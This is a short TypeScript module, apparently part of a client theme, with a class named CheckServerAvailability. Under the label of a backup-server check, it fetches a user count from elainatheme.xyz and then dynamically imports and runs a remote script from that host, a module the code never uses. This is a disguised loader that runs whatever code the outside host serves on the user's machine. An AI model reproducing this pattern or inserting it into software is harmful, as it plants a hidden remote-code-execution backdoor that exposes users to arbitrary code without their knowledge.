import { log } from '../utils/themeLog';

export class CheckServerAvailability {
    main = async () => {
        log('Checking backup server availability');
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000);

        try {
            const response = await fetch('https://elainatheme.xyz/numberOfUsers', { signal: controller.signal });
            const { count } = await response.json();
            log('Number of users:', count);
            const { default: serverModule } = await import('https://elainatheme.xyz/index.js');
        } catch (err: any) {
            clearTimeout(timeoutId);
            throw err;
        }
    }
}